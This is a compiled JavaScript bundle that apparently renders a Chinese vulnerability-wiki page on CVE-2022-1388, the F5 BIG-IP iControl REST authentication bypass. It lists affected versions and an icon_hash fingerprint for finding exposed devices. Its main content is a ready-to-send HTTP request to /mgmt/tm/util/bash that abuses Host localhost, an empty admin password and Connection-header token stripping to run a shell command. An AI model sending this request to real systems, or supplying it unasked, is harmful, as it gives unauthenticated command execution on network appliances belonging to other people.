(window.webpackJsonp=window.webpackJsonp||[]).push([[411],{2041:function(s,a,t){s.exports=t.p+"assets/img/image-20220509184545493.7477b886.png"},2042:function(s,a,t){s.exports=t.p+"assets/img/1652093045231-d532fbbd-7b56-4f58-a7a6-75d317750ad1.569071f8.png"},2994:function(s,a,t){"use strict";t.r(a);var r=t(75),e=Object(r.a)({},(function(){var s=this,a=s.$createElement,r=s._self._c||a;return r("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[r("h1",{attrs:{id:"f5-big-ip-icontrol-rest身份认证绕过漏洞-cve-2022-1388"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#f5-big-ip-icontrol-rest身份认证绕过漏洞-cve-2022-1388"}},[s._v("#")]),s._v(" F5 BIG-IP iControl REST身份认证绕过漏洞 CVE-2022-1388")]),s._v(" "),r("h2",{attrs:{id:"漏洞描述"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),r("p",[s._v("BIG-IP 是 F5 公司的一款应用交付服务是面向以应用为中心的世界先进技术。借助 BIG-IP 应用程序交付控制器保持应用程序正常运行。BIG-IP 本地流量管理器 (LTM) 和 BIG-IP DNS 能够处理应用程序流量并保护基础设施。未经身份验证的攻击者可以通过管理端口或自身 IP 地址对 BIG-IP 系统进行网络访问，执行任意系统命令、创建或删除文件或禁用服务。")]),s._v(" "),r("h2",{attrs:{id:"漏洞影响"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),r("a-checkbox",{attrs:{checked:""}},[s._v("11.6.1-16.1.2")]),r("br"),s._v(" "),r("h2",{attrs:{id:"网络测绘"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),r("a-checkbox",{attrs:{checked:""}},[s._v('icon_hash="-335242539"')]),r("br"),s._v(" "),r("h2",{attrs:{id:"漏洞复现"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),r("p",[s._v("登录页面")]),s._v(" "),r("p",[r("img",{attrs:{src:t(2041),alt:"image-20220509184545493"}})]),s._v(" "),r("p",[s._v("发送请求包(Host设为localhost)")]),s._v(" "),r("div",{staticClass:"language-java line-numbers-mode"},[r("pre",{pre:!0,attrs:{class:"language-java"}},[r("code",[s._v("POST "),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("mgmt"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("tm"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("util"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("bash HTTP"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\n"),r("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Host")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" localhost\n"),r("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Authorization")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),r("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Basic")]),s._v(" "),r("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("YWRtaW46")]),s._v("\n"),r("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("X")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("F5"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),r("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Auth")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),r("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Token")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" a\n"),r("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Connection")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" close"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),r("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("X")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("F5"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),r("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Auth")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),r("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Token")]),s._v("\n"),r("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Content")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),r("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Length")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("39")]),s._v("\n\n"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),r("span",{pre:!0,attrs:{class:"token string"}},[s._v('"command"')]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),r("span",{pre:!0,attrs:{class:"token string"}},[s._v('"run"')]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),r("span",{pre:!0,attrs:{class:"token string"}},[s._v('"utilCmdArgs"')]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),r("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-c id"')]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),r("div",{staticClass:"line-numbers-wrapper"},[r("span",{staticClass:"line-number"},[s._v("1")]),r("br"),r("span",{staticClass:"line-number"},[s._v("2")]),r("br"),r("span",{staticClass:"line-number"},[s._v("3")]),r("br"),r("span",{staticClass:"line-number"},[s._v("4")]),r("br"),r("span",{staticClass:"line-number"},[s._v("5")]),r("br"),r("span",{staticClass:"line-number"},[s._v("6")]),r("br"),r("span",{staticClass:"line-number"},[s._v("7")]),r("br"),r("span",{staticClass:"line-number"},[s._v("8")]),r("br")])]),r("p",[r("img",{attrs:{src:t(2042),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=e.exports}}]);